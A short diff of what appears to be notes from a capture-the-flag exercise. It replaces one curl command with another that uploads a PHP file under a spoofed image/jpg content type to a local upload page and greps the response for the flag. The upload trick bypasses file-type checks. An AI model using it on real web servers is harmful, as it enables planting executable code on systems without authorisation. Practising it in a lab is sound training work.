@@ -1,4 +1,5 @@
-curl -X POST -F "name=Upload" -F "Uploaded=@file.php;type=application/x-httpd-php" "http://localhost:8080/index.php?page=upload"
+
+curl -X POST -F "uploaded=@file.php;type=image/jpg" -F Upload=upload "http://localhost:8080/index.php?page=upload" | grep "The flag is :"
 
 
 
@@ -6,6 +7,4 @@ curl -X POST -F "name=Upload" -F "Uploaded=@file.php;type=application/x-httpd-ph
 
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
 
-
-Content-Disposition: form-data; name="uploaded"; filename="1670093329-apng-clock.apng"
-Content-Type: image/apng
+resource : https://curl.se/docs/manpage.html#-F
